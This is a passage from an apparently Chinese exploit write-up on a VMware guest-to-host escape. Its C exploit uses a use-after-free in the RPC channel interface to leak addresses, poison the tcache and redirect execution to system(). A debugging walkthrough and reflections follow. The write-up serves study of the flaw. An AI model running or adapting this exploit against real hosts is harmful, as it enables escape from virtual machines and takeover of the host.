BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token comment">//run_cmd(s1);</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>把断点放在realloc的位置，方便查看realloc后的堆布局。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" alt="图片.png"></p><p>在第一次free的位置看到了目标chunk，<code>0x7f797803a890</code>，这个chunk就是我们要复用的chunk。此次realloc结束，应该被挂进tcache。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" alt="图片.png"></p><p>整个chunk的内容，可以看到大小是0x115，这里不知道为啥，连地址都没对齐。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" alt="图片.png"></p><p>单步执行之后，看到被挂进tcache的chunk。当channel 1，alloc取出这块chunk的时候，没有触发到realloc，直接走过去了。所以没断下来。因该在if的判断位置加一个断点，查看堆布局的。</p><p>不过此时可以看一下目标chunk的内容，有没有被改变。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" alt="图片.png"></p><p>可以看到被挂上了熟悉的fd，但是却没有在相应的tcache里面，则可以推断，该chunk已经是alloc状态了。</p><p>继续执行，第二次free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" alt="图片.png"></p><p>此次realloc依然触发free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" alt="图片.png"></p><p>chunk被挂进了tcache，然后下一步执行dnd_version应该会把chunk取出，然后把虚表指针写入。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" alt="图片.png"></p><p>成功写入，接下来就是改写system的过程。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" alt="图片.png"><br> channel 0的第一次free，记住chunk地址，0x7fa59c028e20，然后和leak一眼，对channel 1的UAF。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" alt="图片.png"></p><p>劫持成功，但是此时tcache中却看不到，可能heapinfo有点问题。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" alt="图片.png"></p><p>计算偏移后，目标位置被打入tcache的fd中，然后就是常规利用。把该内存malloc出来。然后写入system</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" alt="图片.png"></p><p>成功写入system，继续执行，然后弹出计算器。<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" alt="图片.png"></p><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>emm，调试总是遇到一些问题，有时候挂上gdb，leak出来的基址就不对了。。。离谱，不知道为什么。想到的办法是，先发送完payload，然后再attach上去，exp和leak部分分开调试。</p><p>还有虚拟机的vmx，移动的时候，权限关系，可能导致打不开虚拟机，只有使用sudo  